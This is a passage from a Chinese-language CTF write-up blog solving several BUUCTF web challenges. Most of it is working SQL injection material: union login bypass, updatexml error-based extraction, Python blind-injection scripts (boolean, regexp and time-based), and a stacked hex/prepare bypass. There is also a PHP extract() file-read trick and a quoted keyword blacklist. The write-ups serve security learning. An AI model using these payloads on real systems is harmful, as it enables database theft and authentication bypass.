class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        response = requests.get(url + payload.format(index=i, char=mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h2 id="GXYCTF2019-BabysqliV1">GXYCTF2019 BabysqliV1</h2>
<blockquote>
<p>原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</p>
<p>(BUUCTF没有提示啊!!!)</p>
</blockquote>
<h3 id="考点-v7">考点</h3>
<ul>
<li>SQL联合查询</li>
</ul>
<h3 id="解题-v7">解题</h3>
<p>先FUZZ一波过滤了某些字符，常规的注入都没能pass，查看源码发现一个<code>search.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200621142049.png" alt=""></p>
<blockquote>
<p>先说说base32 和 base64 的区别，<br>
base32 只有大写字母和数字数字组成，或者后面有三个等号。<br>
base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。<br>
明显，那段文字是base32加密</p>
</blockquote>
<p>解密后：<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p>
<p>继续base64解密：<code>select * from user where username = '$name'</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;1&#39; or 1&#x3D;1#&amp;pw&#x3D;1  &#x2F;&#x2F; wrong user!    </span><br><span class="line">&gt;&gt;&gt; do not hack me!  &#x2F;&#x2F; or和&#x3D;被过滤了</span><br><span class="line">name&#x3D;1&#39; Or 1#&amp;pw&#x3D;1   &#x2F;&#x2F; 大小写直接绕过了</span><br><span class="line">name&#x3D;1&#39; Or 1 Order by 4#&amp;pw&#x3D;1</span><br><span class="line">&gt;&gt;&gt; Error: Unknown column &#39;4&#39; in &#39;order clause&#39; &#x2F;&#x2F;可以知道有三个column</span><br></pre></td></tr></table></figure>
<p>盲猜字段名为<code>id</code>、<code>username</code>、<code>password</code>，当<code>username</code>为<code>admin</code>时会说<code>wrong pass!</code>，其他都是<code>wrong user!</code>，username应该就是<code>admin</code>了。</p>
<p>那么逻辑就是：<strong>先判断<code>username</code>在不在数据库,再判断密码对不对</strong>，这样我们就可以通过联合查询的时候会创一个虚拟的表单，让他查这个虚拟表。</p>
<p>下面猜测admin在哪个字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;1&#39;union select 1,&#39;admin&#39;,3#</span><br></pre></td></tr></table></figure>
<p>我们知道有admin用户的，经测试<code>name=1'union select 1,'admin',3#</code>报密码错误，说明这里就是username了，password字段应该是3的位置。</p>
<p>这道题得猜它的后端源码是怎么写的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$passwd = md5($_POST[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">&quot;Wrong Pass&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于name参数可注，我们可以构造sql语句使其查询为假，然后联合查询出一个比如<code>0f5ed8a8d8d44d86a570aacffa922251</code>(ca01h的md5)，然后密码输入<code>ca01h</code>，就会查询成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username &#x3D; 1&#39; union select 1,&#39;admin&#39;,&#39;0f5ed8a8d8d44d86a570aacffa922251&#39;#</span><br><span class="line">password &#x3D; ca01h</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://www.gem-love.com/ctf/453.html">https://www.gem-love.com/ctf/453.html</a></p>
</blockquote>
<h2 id="RCTF2015-EasySQL">RCTF2015 EasySQL</h2>
<h3 id="考点-v8">考点</h3>
<ul>
<li>报错注入</li>
<li>二次注入</li>
</ul>
<h3 id="解题-v8">解题</h3>
<p>主要有三个功能，注册、登录和修改密码，这种情况一般都是二次注入的问题。</p>
<p>在注册页面，试了一下，<code>username</code> 和 <code>email</code> 处有过滤，直接 fuzz 一下哪些字符被禁了</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212053.png" alt=""></p>
<p>注册用户名<code>zzz\</code>，在点击修改密码后，有一个报错：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212223.png" alt=""></p>
<p>猜测SQL语句应该是这样写的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;zzz\&quot; and pwd &#x3D; &#39;92dd83acc13018d34e2454d4c5c05cf3&#39;</span><br></pre></td></tr></table></figure>
<p>使用报错注入的方式爆出数据</p>
<ul>
<li>
<p>获取当前用户信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~root@localhost~'</code></p>
</li>
<li>
<p>查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~web_sqli~'</code></p>
</li>
<li>
<p>查看数据库的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~article,flag,users~'</code></p>
</li>
<li>
<p>查看<code>users</code>表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~name,pwd,email,real_flag_1s_her'</code></p>
<p>使用reverse函数查看后面的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~ereh_s1_galf_laer,liame,dwp,ema'</code></p>
</li>
<li>
<p>查看<code>real_flag_1s_here</code>字段的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'</code></p>
<p>看到有很多垃圾数据，用<code>regexp</code>匹配<code>f</code>开头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~flag&#123;e43ad246-f211-4292-a531-c3'</code></p>
<p>再用reverse函数读后面的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>返回<code>XPATH syntax error: '~&#125;04c7d828343c-135a-2924-112f-64'</code></p>
</li>
</ul>
<h2 id="GYCTF2020-Ezsqli">GYCTF2020 Ezsqli</h2>
<h3 id="考点-v9">考点</h3>
<ul>
<li>无information_schema布尔盲注</li>
<li>无列名注入</li>
</ul>
<h3 id="解题-v9">解题</h3>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714113824.png" style="zoom: 50%;" />
<p>过滤很多东西，比如information_schema、union…select、join、if、and、or等等，基本上就是考虑盲注了。</p>
<p>另外还发现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">返回V&amp;N</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||1&#x3D;1</span><br><span class="line">返回Nu1l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||1&#x3D;5</span><br><span class="line">返回V&amp;N</span><br></pre></td></tr></table></figure>
<p>也就是说，本来2查询的是V&amp;N，如果<code>||</code>后面的表达式为True则返回Nu1L、false则返回V&amp;N。</p>
<p>判断一下是不是盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||length(database())&gt;0</span><br><span class="line">返回Nu1l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||length(database())&lt;0</span><br><span class="line">返回V&amp;N</span><br></pre></td></tr></table></figure>
<p>确定是盲注了，那么就直接写脚本用二分法盲注表名，可以使用sys.schema_table_statistics_with_buffer</p>
<blockquote>
<p>innodb_table_stats和innodb_index_stats和sys.schema_table_statistics也可以使用</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://acbcc15b-d8f2-48b3-9c67-3b16b465068f.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;2||ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(target, i, mid)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>得到表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">users23333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
<p>下面就要实现无列名注入</p>
<blockquote>
<p>在知道表名，不知道列名的情况下，我们可以利用<code>union</code>来给未知列名“重命名”，还可以利用报错函数来注入出列名。</p>
</blockquote>
<p>这道题再提出一种思路，ascii位偏移大小比较。名字听起来比较玄乎，但是原理很简单：</p>
<blockquote>
<p>核心payload：<code>(select 'admin','admin')&gt;(select * from users limit 1)</code></p>
</blockquote>
<p>假设flag为flag{bbbbb}，对于payload这个两个select查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这个不难懂，和c语言的<code>strcmp()</code>函数原理一样，举几个例子：</p>
<ul>
<li>glag &gt; flag{bbbbb}</li>
<li>alag{zzzzzzzzzzz} &lt; flag{bbbbb}</li>
<li>a &lt; flag{bbbbb}</li>
<li>z &gt; flag{bbbbb}</li>
</ul>
<p>在这样的按位比较过程中，因为在里层的<code>for()</code>循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c&gt;b此时满足了，题目返回真，出现了Nu1L关键字，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以<code>flag += chr(char-1)</code>，这就是为什么在存flag时候要往前偏移一位的原因。</p>
<p>另外还需要注意的地方是，字段数一定是一一匹配，这里f1ag_1s_h3r3_hhhhh是有两个字段的(可以用select 1|select 1,2|select 1,2,3试一试)，知道是两个字段后，还要注意字段内的一一对应，f1ag_1s_h3r3_hhhhh表中的flag在第二个字段。</p>
<p>直接show code：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://98ef5288-1d34-4680-a03c-1aa5f5fbfaad.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;2||(select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        char = result + chr(j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(char)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            result += chr(j - <span class="number">1</span>)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>这样就可以成功的拿到flag。</p>
<h2 id="GXYCTF2019-BabysqliV3">GXYCTF2019 BabysqliV3</h2>
<h2 id="NCTF2019-SQLi">NCTF2019 SQLi</h2>
<h3 id="考点-v10">考点</h3>
<ul>
<li>regex盲注</li>
</ul>
<p>参考文章：<a href="https://xz.aliyun.com/t/8003">REGEXP注入与LIKE注入</a></p>
<h3 id="解题-v10">解题</h3>
<p>hint.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
<p>找到admin的密码即可得flag</p>
<p>由于单引号被禁用，使用 \ 转义and前面的那个单引号，使得 <code>'\' and passwd='</code> 形成闭合。构造passwd处为 <code>||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>，用regexp查询passwd ^匹配字符串开头 %00截断后面的内容。但是不能在输入框直接提交，会被url encode 变为%2500被黑名单拦截。</p>
<p>查询语句变为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;\&#39; and passwd&#x3D;&#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^a&quot;;</span><br></pre></td></tr></table></figure>
<p>如果regex为真的话，会返回404，否则跳转至登录界面。</p>
<p>盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://aabb7aa1-f68f-44c7-9e75-514410c6d6f2.node3.buuoj.cn/index.php&#x27;&#x27;&#x27;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">strs = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> strs:</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.format(passwd+m, parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">404</span>:</span><br><span class="line">            passwd += m</span><br><span class="line">            print(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(passwd)</span><br></pre></td></tr></table></figure>
<h2 id="SWPUCTF2019-web1">SWPUCTF2019 web1</h2>
<h3 id="考点-v11">考点</h3>
<ul>
<li>十六进制+MySQL预编译绕过</li>
<li>PHP代码审计</li>
</ul>
<h3 id="解题-v11">解题</h3>
<p>题目只有一个登录框，注册功能未开放，随意填写内容，点击登录，抓包</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090843.png" alt=""></p>
<p>在username字段添加一个单引号PHP会报错</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090948.png" alt=""></p>
<p>而闭合引号后会正常显示。因此可大致确定注入存在，随后开始构造payload。由于题目对username进行了严格的检测，所以无法使用单语句进行注入，但是注入点又存在，于是可以尝试进行堆叠注入。</p>
<p>不过貌似过滤了绝大多数的关键字，采用16进制+MySQL预处理绕过。原理如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816091925.png" alt=""></p>
<p>编写时间盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://71c8375e-74ff-45aa-a2ee-8670864f6b0b.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>: payloads.format(str_to_hex(payload.format(i, j))), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([hex(ord(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>最后跑出了一个源代码，进行审计。</p>
<p>既然是MVC架构，先弄清楚路由</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$r = explode(<span class="string">&#x27;/&#x27;</span>, $_REQUEST[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line">	<span class="keyword">list</span>($controller,$action) = $r;</span><br><span class="line">	$controller = <span class="string">&quot;<span class="subst">&#123;$controller&#125;</span>Controller&quot;</span>;</span><br><span class="line">	$action = <span class="string">&quot;action<span class="subst">&#123;$action&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(class_exists($controller))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(method_exists($controller,$action))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			$action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$controller = <span class="string">&quot;LoginController&quot;</span>;</span><br><span class="line">        $action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    $data = call_user_func(<span class="keyword">array</span>( (<span class="keyword">new</span> $controller), $action));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location:index.php?r=Login/Index&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从r参数中获取要访问的Controller以及Action,然后以/分隔开后拼接成完整的控制器名。以Login/Index为例，就是将Login/Index分隔开分别拼接成LoginController以及actionIndex,然后调用LoginController这个类中的actionIndex方法。每个action里面会调用对应的loadView()方法进行模版渲染，然后将页面返回给客户端。若访问的Controller不存在则默认解析Login/Index。</p>
<p>下面看关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params">$viewName =<span class="string">&#x27;&#x27;</span>, $viewData = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">   &#123;</span><br><span class="line">      extract($viewData);</span><br><span class="line">      <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显可以通过extract来覆盖变量，不过现在还不知道需要覆盖什么变量，寻找几个调用loadView的方法，发现一个对<code>$viewData</code>完全可控的地方。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadView(<span class="string">&#x27;userIndex&#x27;</span>,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$listData</code>是从REQUEST提取出来的，完全可控。而其对应的/View/userIndex.php中存在一个文件读取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">     $img_file = <span class="string">&#x27;/../favicon.ico&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line">$img_base64 = imgToBase64($img_dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>这样，<code>$img_file</code>可通过<code>extract($viewData)</code>变量覆盖漏洞完全控制，而<code>$viewData</code>是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。</p>
<p>所以访问<code>?r=User/Index&amp;img_file=/../flag.php</code>可直接获取flag.php经base64后的内容。</p>
<h2 id="强网杯2019-Fakebook">强网杯2019 Fakebook</h2>
<h3 id="考点-v12">考点</h3>
<ul>
<li>源码泄露</li>
<li>SQL注入</li>
<li>PHP反序列化</li>
<li>SSRF</li>
</ul>
<h3 id="题解">题解</h3>
<p>有robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>
<p>访问一下拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = 